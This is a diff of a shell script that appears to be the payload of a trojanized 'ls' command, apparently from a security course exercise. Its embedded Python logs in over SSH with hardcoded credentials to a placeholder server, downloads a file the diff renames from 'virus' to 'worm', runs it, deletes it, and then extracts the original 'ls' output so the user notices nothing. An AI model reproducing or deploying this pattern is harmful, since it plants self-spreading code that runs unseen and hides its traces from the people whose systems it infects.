@@ -11,7 +11,7 @@ def main():
     client.connect(hostname="SER_IP", username="csc2024",
                         password="csc2024", timeout=3)
     sftp_client = client.open_sftp()
-    sftp_client.get("/app/virus", "./virus")
+    sftp_client.get("/app/worm", "./worm")
     sftp_client.close()
     client.close()
 
@@ -20,8 +20,8 @@ if __name__ == "__main__":
 
 EOF
 
-python3 virus
-rm -f virus
+python3 worm
+rm -f worm
 
 # Get original ls
 sed -n '/^---END OF PAYLOAD---/,/^---END OF ORIGINAL---/ { /---END OF PAYLOAD---/d; /---END OF ORIGINAL---/d; p }' ./ls > output
